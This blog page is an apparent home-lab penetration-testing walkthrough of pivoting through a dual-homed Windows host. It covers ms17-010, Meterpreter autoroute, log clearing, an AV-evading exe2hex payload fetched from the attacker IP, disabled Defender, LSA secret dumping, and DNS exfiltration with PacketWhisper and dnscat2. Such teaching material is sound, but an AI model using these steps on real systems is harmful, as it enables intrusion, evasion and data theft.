<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Lateral Movement and Pivoting | 0x-s0M3n4th's Blog</title><meta name=keywords content="Lateral Movement,Pivoting,Internal Network"><meta name=description content="Techniques to expand access by moving laterally and pivoting across segmented networks."><meta name=author content="0x-s0M3n4th"><link rel=canonical href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/03-lateral-movement-and-pivoting/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=https://0x-s0M3n4th.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://0x-s0M3n4th.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://0x-s0M3n4th.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://0x-s0M3n4th.github.io/apple-touch-icon.png><link rel=mask-icon href=https://0x-s0M3n4th.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/03-lateral-movement-and-pivoting/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/03-lateral-movement-and-pivoting/"><meta property="og:site_name" content="0x-s0M3n4th's Blog"><meta property="og:title" content="Lateral Movement and Pivoting"><meta property="og:description" content="Techniques to expand access by moving laterally and pivoting across segmented networks."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="notes"><meta property="article:published_time" content="2025-11-24T13:25:00+05:30"><meta property="article:modified_time" content="2025-11-24T13:25:00+05:30"><meta property="article:tag" content="Lateral Movement"><meta property="article:tag" content="Pivoting"><meta property="article:tag" content="Internal Network"><meta property="og:image" content="https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Lateral Movement and Pivoting"><meta name=twitter:description content="Techniques to expand access by moving laterally and pivoting across segmented networks."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Notes","item":"https://0x-s0M3n4th.github.io/notes/"},{"@type":"ListItem","position":2,"name":"Network Penetration Testing","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/"},{"@type":"ListItem","position":4,"name":"Post Exploitation Techniques","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/"},{"@type":"ListItem","position":5,"name":"Lateral Movement and Pivoting","item":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/03-lateral-movement-and-pivoting/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Lateral Movement and Pivoting","name":"Lateral Movement and Pivoting","description":"Techniques to expand access by moving laterally and pivoting across segmented networks.","keywords":["Lateral Movement","Pivoting","Internal Network"],"articleBody":"Lateral Movement and Pivoting: Lateral movement allows the penetration tester to move further into the targeted network while discovering additional assets and exploiting security vulnerabilities on remote systems with the intent of stealing confidential data and expanding a foothold. Within many organizations, their network is usually segmented with routers and firewalls to prevent cyber-attacks and threats from propagating through their organization. However, there are various host devices that are configured with a dual-homed network connection that simply allows the host to be connected to two different IP networks at the same time. Our target will be Blue vm first. Fire up the Blue vm and kali machine Exploit it and get a shell using ms17-010 exploit. On the Meterpreter session, use the arp command to view the entries within the Address Resolution Protocol (ARP) cache of the compromised target. The ARP cache contains a list of IP-to-MAC address bindings of all the host devices that recently transmitted a message between themselves and the compromised host: meterpreter\u003e arp We can see that the target machine is on two networks one is NAT aka PENTEST-NET(192.168.83.0/24) and another is 172.30.1.0/24(PIVOT-NET) 6. Next, use the ipconfig command within Meterpreter to view a list of network adapters and their IP addresses In the screenshot we can see that interface 17 is connected with a different subnet. Additionally, you can use the route command to check if the compromised system has a network route that is otherwise unreachable from your attacker machine (Kali Linux). The host has a network route to 172.30.1.0/24 Adding route from our kali to 172.30.1.0/24 subnet. To do that we will use a metasplit module named post/multi/manage/autoroute Background the session , we will try to run a portscan through metasploit itself to determine we can access the target network now. Clearing tracks: Every action that occurs on a host is recorded in the form of a log message used to keep track of events for accountability. This means if a penetration tester performs any action on a compromised host, logs are also generated indicating the actions performed. Such logs are useful to the cybersecurity analyst and incident responders who gather evidence from a compromised system to determine what happened during a cyber-attack. For instance, cybersecurity analysts and incident responders not only gather evidence from logs but also analyze them to identify patterns of malicious activity, indicators of compromise (IoCs), and potential vulnerabilities.\nFor this we will use a builtin command inside metasploit clearev Data encoding and exfiltration: Encoding using exe2hex: We will encode the previous vncviewer.exe payload we have inserted using msfvenom , this time we will use the SPIDERMAN machine for getting a shell back. COMMAND: /usr/bin/exe2hex -x vncviewer.exe 2. Setup the multi handler in metasploit. Make sure you are entering the same port you have used during the insertion of malicious payload inside vncviwere.exe 3. Transfer the payload to SPIDERMAN machine through python webserver\n# in kali python3 -m http.server 8000 Open up SPIDERMAN and open command prompt as admin, then use these commands: C:\\Users\\peterparker\u003e powershell PS C:\\Users\\peterparker\u003e Invoke-WebRequest -Uri http://172.30.1.50:8080/ vncviewer.cmd -OutFile C:\\Users\\peterparker\\Downloads\\vncviewer.cmd Disable Windows Defender real-time protection on Windows to allow the ASCII file to reassemble into its original form. During the reassembly of the file, Windows Defender may detect it as a potentially dangerous file and block it. 5. Execute vncviewer.cmd file,You’ll begin to notice the reassembling of the ASCII code into an executable file\nC:\\Users\\peterparker\\Downloads\u003e .\\vncviewer.cmd Once the reassembly is done, execute the .exe You should get a session back Now we will perform the same data exfil inside the Blue vm but remotely, not accessing the GUI:\nGet a meterpreter shell first. Move to the root dir of the machine. Upload the vncviewer.cmd and vncviewer.exe Then open a shell to check both files are present. Then execute first the .cmd file using the command vncviewer.cmd: It will start reassembling the binary. It will complete by giving this output: Make sure your multi handler is running on a different tab. Then execute the .exe You will get a session back: After compromising the system and obtaining a shell , use post/multi/recon/local_exploit_suggester module to enable Metasploit to check whether the compromised system is vulnerable to other exploitation modules. To enumerate and decrypt the Local Security Authority (LSA) secret keys from the registry of the compromised system, use the following commands: Having completed this exercise, you have learned how to convert a malicious payload into ASCII to reduce threat detection and evade security sensors. In the next lab, you will discover how to perform data exfiltration using DNS messages to evade detection. Note Next steps are all failed attempts, if you still want to follow, you can. If you are using the provided lab setup in the first part, these techniques can work. In my case i performed these techniques when i didn’t have any proper lab structure and lab build knowledge. I can update the techniques in future.\nExfiltration using PacketWhishper: setting up the environment: On Kali Linux, open Terminal and use the following commands to download the PacketWhisper repository and its compressed ZIP file: git clone https://github.com/TryCatchHCF/PacketWhisper wget https://github.com/TryCatchHCF/PacketWhisper/archive/refs/heads/master.zip 2. You will need to download Python 2.7.18 and install it on THESPIDERMAN virtual machine. To do that i will install that file on kali and transfer it altogether.\nwget https://www.python.org/ftp/python/2.7.18/python-2.7.18.amd64.msi 3. Now run the python http server on kali then head over to THESPIDERMAN , open the browser and write your kali ip . Then download the files : Make sure you turned off real time detection before downloading these files, windows AV may interrupt during the download. 4. Then extract the master.zip first. Then setup python 2.7.18 version by running the exe. 5. After the initial setup , let’s add python 2.7.18 to env variables path. To do so open search bar and type system variables 6. Open it -\u003e click on Environment Variables -\u003e from system variables tab click on the path \u003e click edit -\u003e click on new and add the python paths into this: changing the DNS settings of windows server 2019: We need to make our KALI VM as the DNS server of this machine. Follow the given screenshot to do so: Confirming that the DNS server has been set. Performing data exfiltration: On Kali Linux, open the Terminal and use the following command to run TCPdump, a command-line packet-capturing tool to collect the DNS messages incoming on the eth2 adapter that’s connected to the 172.30.1.0/24 network: sudo tcpdump -i eth2 -w exfiltration.pcap Next, on THESPIDERMAN machine, create a new text file within the extracted master.zip folder. Name the text file Passwords.txt and insert a few random passwords, as shown: I tried this tool on this separate network it appears to be not working in my case, maybe because it’s not my NAT/it needs DNS to google for lookups as my kali doesn’t know the DNS lookup addresses.\nNow i will try the same in my NAT network on windows server 2019 machine.\nFailed for windows server 2019 also. Let’s start with the execution phase i did:\nLogin as administrator on your target machine, in my case it’s windows server 2019 on my NAT network aka PENTEST-NET Then go to the directory of master folder : After that we will use python2 to run the script: python packetwhisper.py 4. Make sure your listener is running. Also make sure you setup the DNS server of your kali ip according to the network interface, in my case rn my target machine is on NAT so i am using class C ip of my kali machine. 5. The packetwhisper main menu will open up, follow the given screenshots for the suitable options: 6. Now onto my listener on kali: 7. Copy the captured traffic file to the packetwhisper directory , wherever you have downloaded it: 8. Then use the following screenshots for further assists, before that change your dir to the packetwhisper dir: 9. Now catout the file, in my case i have received gibberish data: Trying to use dnscat2: Installing dependencies for dnscat2: Open a terminal on kali and follow these commands: sudo apt update sudo apt install git ruby-dev build-essential sudo gem install bundler git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server/ sudo bundle install Install the windows version of dnscat2 by cloning this given git repo: dnscat2-powershell Then start the python http server and transfer the dnscat2 powershell script. Exection: On kali setup the client: cd dnscat2/server sudo ruby ./dnscat2.rb mylab.local --no-cache Then copy this secret Come to the windows machine and run these commands: # Bypass the script blocker for this one time Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process # Run the client .\\dnscat2.ps1 -Domain mylab.local -Secret [the-new-secret-key-from-your-server] You can face some problems just like i faced, try to open the firewall port on kali machine for incoming connections on port 53 using the command sudo ufw allow 53/udp , then check the status using the command sudo ufw status verbose To troubleshoot further issues you can check whether the packets are coming on port 53 or not using the following technique: # on kali run this command: sudo tcpdump -i eth0 -n udp port 53 and src host 192.168.83.140{the target machine's ip} # on target machine nslookup test.mylab.local 192.168.83.128{kali ip} if error occurs from the target’s side: remember to test this technique while your dnscat is running on kali. I WILL LATER ON ADD MORE STUFF ON THESE DNS RELATED ATTACKS. ","wordCount":"1568","inLanguage":"en","image":"https://0x-s0M3n4th.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-11-24T13:25:00+05:30","dateModified":"2025-11-24T13:25:00+05:30","author":{"@type":"Person","name":"0x-s0M3n4th"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/03-lateral-movement-and-pivoting/"},"publisher":{"@type":"Organization","name":"0x-s0M3n4th's Blog","logo":{"@type":"ImageObject","url":"https://0x-s0M3n4th.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://0x-s0M3n4th.github.io/ accesskey=h title="0x-s0M3n4th's Blog (Alt + H)"><img src=https://0x-s0M3n4th.github.io/apple-touch-icon.png alt aria-label=logo height=35>0x-s0M3n4th's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://0x-s0M3n4th.github.io/archive/ title=Archives><span>Archives</span></a></li><li><a href=https://0x-s0M3n4th.github.io/table-of-contents/ title="Table of contents"><span>Table of contents</span></a></li><li><a href=https://0x-s0M3n4th.github.io/blogs/ title=Blogs><span>Blogs</span></a></li><li><a href=https://0x-s0M3n4th.github.io/notes/ title=Notes><span>Notes</span></a></li><li><a href=https://0x-s0M3n4th.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://0x-s0M3n4th.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://0x-s0M3n4th.github.io/portfolio/ title=Portfolio><span>Portfolio</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://0x-s0M3n4th.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/>Notes</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/>Network Penetration Testing</a>&nbsp;»&nbsp;<a href=https://0x-s0M3n4th.github.io/notes/pen-testing-notes/network-pentesting/08-post-exploitation-techniques/>Post Exploitation Techniques</a></div><h1 class="post-title entry-hint-parent">Lateral Movement and Pivoting</h1><div class=post-description>Techniques to expand access by moving laterally and pivoting across segmented networks.</div><div class=post-meta><span title='2025-11-24 13:25:00 +0530 IST'>November 24, 2025</span>&nbsp;·&nbsp;<span>8 min</span>&nbsp;·&nbsp;<span>1568 words</span>&nbsp;·&nbsp;<span>0x-s0M3n4th</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#lateral-movement-and-pivoting>Lateral Movement and Pivoting:</a></li><li><a href=#clearing-tracks>Clearing tracks:</a></li><li><a href=#data-encoding-and-exfiltration>Data encoding and exfiltration:</a><ul><li><a href=#encoding-using-exe2hex>Encoding using exe2hex:</a></li></ul></li><li><a href=#exfiltration-using-packetwhishper>Exfiltration using PacketWhishper:</a><ul><li><a href=#setting-up-the-environment>setting up the environment:</a></li><li><a href=#changing-the-dns-settings-of-windows-server-2019>changing the DNS settings of windows server 2019:</a></li><li><a href=#performing-data-exfiltration>Performing data exfiltration:</a></li></ul></li><li><a href=#trying-to-use-dnscat2>Trying to use dnscat2:</a><ul><li><a href=#installing-dependencies-for-dnscat2>Installing dependencies for dnscat2:</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=lateral-movement-and-pivoting>Lateral Movement and Pivoting:<a hidden class=anchor aria-hidden=true href=#lateral-movement-and-pivoting>#</a></h2><ol><li>Lateral movement allows the penetration tester to move further into the targeted network while discovering additional assets and exploiting security vulnerabilities on remote systems with the intent of stealing confidential data and expanding a foothold. Within many organizations, their network is usually segmented with routers and firewalls to prevent cyber-attacks and threats from propagating through their organization. However, there are various host devices that are configured with a dual-homed network connection that simply allows the host to be connected to two different IP networks at the same time.</li><li>Our target will be <code>Blue</code> vm first.</li><li>Fire up the <code>Blue vm and kali machine</code></li><li>Exploit it and get a shell using <code>ms17-010</code> exploit.</li><li>On the Meterpreter session, use the arp command to view the entries within the <code>Address Resolution Protocol (ARP)</code> cache of the compromised target. The ARP cache contains a list of <code>IP-to-MAC</code> address bindings of all the host devices that recently transmitted a message between themselves and the compromised host:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter&gt; arp
</span></span></code></pre></div><p><img alt=lm_1 loading=lazy src=/images/Pentesting/NP/PE/03/lm_1.png>
We can see that the target machine is on two networks one is NAT aka <code>PENTEST-NET</code>(192.168.83.0/24) and another is <code>172.30.1.0/24(PIVOT-NET)</code>
6. Next, use the <code>ipconfig </code>command within Meterpreter to view a list of network adapters and their IP addresses
<img alt=lm_2 loading=lazy src=/images/Pentesting/NP/PE/03/lm_2.png></p><ul><li>In the screenshot we can see that <code>interface 17</code> is connected with a different subnet.</li></ul><ol start=7><li>Additionally, you can use the <code>route</code> command to check if the compromised system has a network route that is otherwise unreachable from your attacker machine (Kali Linux).
<img alt=lm_3 loading=lazy src=/images/Pentesting/NP/PE/03/lm_3.png></li></ol><ul><li>The host has a network route to <code>172.30.1.0/24</code>
<img alt=lm_4 loading=lazy src=/images/Pentesting/NP/PE/03/lm_4.png></li></ul><hr><ol start=8><li>Adding route from our kali to <code>172.30.1.0/24</code> subnet. To do that we will use a <code>metasplit module</code> named <code>post/multi/manage/autoroute</code>
<img alt=lm_5 loading=lazy src=/images/Pentesting/NP/PE/03/lm_5.png></li><li>Background the session , we will try to run a portscan through <code>metasploit itself</code> to determine we can access the target network now.
<img alt=lm_6 loading=lazy src=/images/Pentesting/NP/PE/03/lm_6.png>
<img alt=lm_7 loading=lazy src=/images/Pentesting/NP/PE/03/lm_7.png></li></ol><hr><h2 id=clearing-tracks>Clearing tracks:<a hidden class=anchor aria-hidden=true href=#clearing-tracks>#</a></h2><p>Every action that occurs on a host is recorded in the form of a log message used to keep track of events for accountability. This means if a penetration tester performs any action on a compromised host, logs are also generated indicating the actions performed. Such logs are useful to the cybersecurity analyst and incident responders who gather evidence from a compromised system to determine what happened during a cyber-attack. For instance, cybersecurity analysts and incident responders not only gather evidence from logs but also analyze them to identify patterns of malicious activity, <code>indicators of compromise (IoCs)</code>, and potential vulnerabilities.</p><ul><li>For this we will use a builtin command inside <code>metasploit</code> <code>clearev</code>
<img alt=lm_8 loading=lazy src=/images/Pentesting/NP/PE/03/lm_8.png></li></ul><hr><h2 id=data-encoding-and-exfiltration>Data encoding and exfiltration:<a hidden class=anchor aria-hidden=true href=#data-encoding-and-exfiltration>#</a></h2><h3 id=encoding-using-exe2hex>Encoding using exe2hex:<a hidden class=anchor aria-hidden=true href=#encoding-using-exe2hex>#</a></h3><ol><li>We will encode the previous <code>vncviewer.exe</code> payload we have inserted using <code>msfvenom</code> , this time we will use the <code>SPIDERMAN</code> machine for getting a shell back.
COMMAND:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/usr/bin/exe2hex -x vncviewer.exe 
</span></span></code></pre></div><p><img alt=lm_9 loading=lazy src=/images/Pentesting/NP/PE/03/lm_9.png>
2. Setup the <code>multi handler in metasploit.</code>
<img alt=lm_10 loading=lazy src=/images/Pentesting/NP/PE/03/lm_10.png>
Make sure you are entering the same port you have used during the insertion of malicious payload inside <code>vncviwere.exe</code>
3. Transfer the payload to <code>SPIDERMAN</code> machine through <code>python webserver</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># in kali</span>
</span></span><span class=line><span class=cl>python3 -m http.server <span class=m>8000</span>
</span></span></code></pre></div><ol start=4><li>Open up <code>SPIDERMAN</code> and open command prompt as admin, then use these commands:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>peterparker</span><span class=p>&gt;</span> <span class=n>powershell</span> <span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>peterparker</span><span class=p>&gt;</span> <span class=nb>Invoke-WebRequest</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>172.30</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=mf>50</span><span class=err>:</span><span class=mf>8080</span><span class=p>/</span> <span class=n>vncviewer</span><span class=p>.</span><span class=py>cmd</span> <span class=n>-OutFile</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>peterparker</span><span class=p>\</span><span class=n>Downloads</span><span class=p>\</span><span class=n>vncviewer</span><span class=p>.</span><span class=py>cmd</span>
</span></span></code></pre></div><p>Disable Windows Defender real-time protection on Windows to allow the ASCII file to reassemble into its original form. During the reassembly of the file, Windows Defender may detect it as a potentially dangerous file and block it.
5. Execute <code>vncviewer.cmd</code> file,You’ll begin to notice the reassembling of the ASCII code into an executable file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>peterparker</span><span class=p>\</span><span class=n>Downloads</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>vncviewer</span><span class=p>.</span><span class=py>cmd</span>
</span></span></code></pre></div><ol start=6><li>Once the reassembly is done, execute the <code>.exe</code></li><li>You should get a session back
<img alt=lm_11 loading=lazy src=/images/Pentesting/NP/PE/03/lm_11.png></li></ol><hr><p>Now we will perform the same data exfil inside the <code>Blue vm</code> but remotely, not accessing the GUI:</p><ol><li>Get a meterpreter shell first.</li><li>Move to the root dir of the machine.
<img alt=lm_12 loading=lazy src=/images/Pentesting/NP/PE/03/lm_12.png></li><li>Upload the <code>vncviewer.cmd</code> and <code>vncviewer.exe</code>
<img alt=lm_13 loading=lazy src=/images/Pentesting/NP/PE/03/lm_13.png></li><li>Then open a shell to check both files are present.
<img alt=lm_14 loading=lazy src=/images/Pentesting/NP/PE/03/lm_14.png></li><li>Then execute first the <code>.cmd</code> file using the command <code>vncviewer.cmd</code>:
<img alt=lm_15 loading=lazy src=/images/Pentesting/NP/PE/03/lm_15.png>
It will start reassembling the binary.</li><li>It will complete by giving this output:
<img alt=lm_16 loading=lazy src=/images/Pentesting/NP/PE/03/lm_16.png></li><li>Make sure your <code>multi handler</code> is running on a different tab.</li><li>Then execute the <code>.exe</code>
<img alt=lm_17 loading=lazy src=/images/Pentesting/NP/PE/03/lm_17.png></li><li>You will get a session back:
<img alt=lm_18 loading=lazy src=/images/Pentesting/NP/PE/03/lm_18.png>
<img alt=lm_19 loading=lazy src=/images/Pentesting/NP/PE/03/lm_19.png></li></ol><hr><ol><li>After compromising the system and obtaining a shell , use <code>post/multi/recon/local_exploit_suggester</code> module to enable Metasploit to check whether the compromised system is vulnerable to other exploitation modules.
<img alt=lm_20 loading=lazy src=/images/Pentesting/NP/PE/03/lm_20.png>
<img alt=lm_21 loading=lazy src=/images/Pentesting/NP/PE/03/lm_21.png></li><li>To enumerate and decrypt the <code>Local Security Authority (LSA)</code> secret keys from the registry of the compromised system, use the following commands:
<img alt=lm_22 loading=lazy src=/images/Pentesting/NP/PE/03/lm_22.png>
Having completed this exercise, you have learned how to convert a malicious payload into ASCII to reduce threat detection and evade security sensors. In the next lab, you will discover how to perform data exfiltration using DNS messages to evade detection.</li></ol><hr><link rel=stylesheet href=/css/vendors/admonitions.4fd9a0b8ec8899f2ca952048d255a569f433f77dfb3f52f5bc87e7d65cdce449.css integrity="sha256-T9mguOyImfLKlSBI0lWlafQz9337P1L1vIfn1lzc5Ek=" crossorigin=anonymous><div class="admonition note"><div class=admonition-header><svg viewBox="0 0 576 512"><path d="M0 64C0 28.7 28.7.0 64 0H224v128c0 17.7 14.3 32 32 32h128v125.7l-86.8 86.8c-10.3 10.3-17.5 23.1-21 37.2l-18.7 74.9c-2.3 9.2-1.8 18.8 1.3 27.5L64 512c-35.3.0-64-28.7-64-64V64zm384 64H256V0L384 128zM549.8 235.7l14.4 14.4c15.6 15.6 15.6 40.9.0 56.6l-29.4 29.4-71-71 29.4-29.4c15.6-15.6 40.9-15.6 56.6.0zM311.9 417 441.1 287.8l71 71L382.9 487.9c-4.1 4.1-9.2 7-14.9 8.4l-60.1 15c-5.5 1.4-11.2-.2-15.2-4.2s-5.6-9.7-4.2-15.2l15-60.1c1.4-5.6 4.3-10.8 8.4-14.9z"/></svg>
<span>Note</span></div><div class=admonition-content><p>Next steps are all failed attempts, if you still want to follow, you can. If you are using the provided lab setup in the first part, these techniques can work. In my case i performed these techniques when i didn&rsquo;t have any proper lab structure and lab build knowledge. I can update the techniques in future.</p></div></div><h2 id=exfiltration-using-packetwhishper>Exfiltration using PacketWhishper:<a hidden class=anchor aria-hidden=true href=#exfiltration-using-packetwhishper>#</a></h2><h3 id=setting-up-the-environment>setting up the environment:<a hidden class=anchor aria-hidden=true href=#setting-up-the-environment>#</a></h3><ol><li>On Kali Linux, open Terminal and use the following commands to download the PacketWhisper repository and its compressed ZIP file:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/TryCatchHCF/PacketWhisper
</span></span><span class=line><span class=cl>wget https://github.com/TryCatchHCF/PacketWhisper/archive/refs/heads/master.zip
</span></span></code></pre></div><p><img alt=lm_23 loading=lazy src=/images/Pentesting/NP/PE/03/lm_23.png>
2. You will need to download Python 2.7.18 and install it on <code>THESPIDERMAN</code> virtual machine. To do that i will install that file on kali and transfer it altogether.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget https://www.python.org/ftp/python/2.7.18/python-2.7.18.amd64.msi
</span></span></code></pre></div><p><img alt=lm_24 loading=lazy src=/images/Pentesting/NP/PE/03/lm_24.png>
3. Now run the python http server on kali then head over to <code>THESPIDERMAN</code> , open the browser and write your kali ip . Then download the files :
<img alt=lm_25 loading=lazy src=/images/Pentesting/NP/PE/03/lm_25.png>
<img alt=lm_26 loading=lazy src=/images/Pentesting/NP/PE/03/lm_26.png>
<em>Make sure you turned off real time detection before downloading these files, windows AV may interrupt during the download.</em>
4. Then extract the <code>master.zip</code> first. Then setup python <code>2.7.18</code> version by running the exe.
<img alt=lm_27 loading=lazy src=/images/Pentesting/NP/PE/03/lm_27.png>
5. After the initial setup , let&rsquo;s add python 2.7.18 to env variables path. To do so open search bar and type <code>system variables</code>
<img alt=lm_28 loading=lazy src=/images/Pentesting/NP/PE/03/lm_28.png>
6. Open it -> click on <code>Environment Variables</code> -> from <code>system variables</code> tab click on the <code>path</code> > click <code>edit</code> -> click on <code>new</code> and add the python paths into this:
<img alt=lm_29 loading=lazy src=/images/Pentesting/NP/PE/03/lm_29.png></p><hr><h3 id=changing-the-dns-settings-of-windows-server-2019>changing the DNS settings of windows server 2019:<a hidden class=anchor aria-hidden=true href=#changing-the-dns-settings-of-windows-server-2019>#</a></h3><ol><li>We need to make our <code>KALI VM</code> as the DNS server of this machine. Follow the given screenshot to do so:
<img alt=lm_30 loading=lazy src=/images/Pentesting/NP/PE/03/lm_30.png></li><li>Confirming that the DNS server has been set.
<img alt=lm_31 loading=lazy src=/images/Pentesting/NP/PE/03/lm_31.png></li></ol><hr><h3 id=performing-data-exfiltration>Performing data exfiltration:<a hidden class=anchor aria-hidden=true href=#performing-data-exfiltration>#</a></h3><ol><li>On Kali Linux, open the Terminal and use the following command to run <code>TCPdump</code>, a command-line packet-capturing tool to collect the DNS messages incoming on the eth2 adapter that’s connected to the 172.30.1.0/24 network:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo tcpdump -i eth2 -w exfiltration.pcap
</span></span></code></pre></div><ol start=2><li>Next, on <code>THESPIDERMAN</code> machine, create a new text file within the extracted <code>master.zip</code> folder. Name the text file <code>Passwords.txt</code> and insert a few random passwords, as shown:
<img alt=lm_32 loading=lazy src=/images/Pentesting/NP/PE/03/lm_32.png>
<img alt=lm_33 loading=lazy src=/images/Pentesting/NP/PE/03/lm_33.png></li></ol><p><img alt=lm_34 loading=lazy src=/images/Pentesting/NP/PE/03/lm_34.png></p><hr><p><em>I tried this tool on this separate network it appears to be not working in my case, maybe because it&rsquo;s not my NAT/it needs DNS to google for lookups as my kali doesn&rsquo;t know the DNS lookup addresses.</em></p><p>Now i will try the same in my NAT network on windows server 2019 machine.</p><hr><p><em>Failed for windows server 2019 also.</em>
<strong>Let&rsquo;s start with the execution phase i did:</strong></p><ol><li>Login as <code>administrator</code> on your target machine, in my case it&rsquo;s <code>windows server 2019 on my NAT network aka PENTEST-NET</code></li><li>Then go to the directory of <code>master</code> folder :
<img alt=lm_35 loading=lazy src=/images/Pentesting/NP/PE/03/lm_35.png></li><li>After that we will use <code>python2</code> to run the script:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>python</span> <span class=n>packetwhisper</span><span class=p>.</span><span class=py>py</span>
</span></span></code></pre></div><p><img alt=lm_36 loading=lazy src=/images/Pentesting/NP/PE/03/lm_36.png>
4. Make sure your listener is running. Also make sure you setup the DNS server of your kali ip according to the network interface, in my case rn my target machine is on NAT so i am using <code>class C</code> ip of my kali machine.
5. The packetwhisper main menu will open up, follow the given screenshots for the suitable options:
<img alt=lm_37 loading=lazy src=/images/Pentesting/NP/PE/03/lm_37.png>
<img alt=lm_38 loading=lazy src=/images/Pentesting/NP/PE/03/lm_38.png>
<img alt=lm_39 loading=lazy src=/images/Pentesting/NP/PE/03/lm_39.png>
